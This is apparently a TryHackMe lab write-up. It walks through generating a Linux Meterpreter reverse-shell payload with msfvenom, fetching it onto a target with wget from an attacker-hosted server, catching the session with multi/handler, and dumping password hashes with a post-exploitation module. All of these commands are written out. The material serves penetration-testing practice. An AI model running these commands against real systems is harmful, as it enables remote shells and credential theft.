# Metasploit Payload & Post-Exploitation Lab

This report documents the full process of generating, deploying, and exploiting a custom **MSFvenom Meterpreter payload** on a Linux target machine, followed by **post-exploitation hash extraction**.

---

## 🚀 Overview

This lab demonstrates:

* Creating a custom **Linux Meterpreter .elf payload** using MSFvenom.
* Transferring the payload to a remote target.
* Using Metasploit's `multi/handler` to catch the reverse shell.
* Gaining a Meterpreter session.
* Using a post-exploitation module to dump user password hashes.

---

## 🔧 Step 1 — Payload Generation (AttackBox)

Used MSFvenom to generate a Linux Meterpreter reverse shell payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKBOX_IP> LPORT=4444 -f elf > peterpreter.elf
```

Payload successfully generated.

---

## 📤 Step 2 — Transfer Payload to Target

Start a simple Python HTTP server:

```bash
python3 -m http.server 9000
```

Download on target:

```bash
wget http://<ATTACKBOX_IP>:9000/peterpreter.elf
chmod +x peterpreter.elf
```

---

## 🎯 Step 3 — Start Metasploit Handler

```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <ATTACKBOX_IP>
set LPORT 4444
run
```

Handler prepared to receive the reverse shell.

---

## 🐚 Step 4 — Execute Payload on Target

```bash
./peterpreter.elf
```

A Meterpreter session was successfully opened.

---

## 🔍 Step 5 — Dumping Hashes (Post-Exploitation)

Background the session:

```bash
background
```

Run the Linux hash dump module:

```bash
use post/linux/gather/hashdump
set SESSION 1
run
```

### 🕵️ Hidden Hash Output

The CTF required recovering the hash of another user.
Hashes are hidden below for privacy.

<details>
  <summary>Click to reveal hash dump (sensitive)</summary>

```
[HASHES HIDDEN]
```

</details>

---

## 🏁 Completion

* Meterpreter session obtained ✔️
* Password hashes extracted ✔️
* CTF flag/hash retrieved ✔️
* Password(s) cracked successfully (optional) ✔️

---

## 📌 Notes

* All actions were performed on an isolated, legal training environment.
* Meterpreter payloads require matching handler configuration (payload, LHOST, LPORT).
* Hashes retrieved follow Linux SHA-512 (sha512crypt) format.

---

## 📘 Author

Metasploit Lab Report generated during penetration testing practice on TryHackMe.
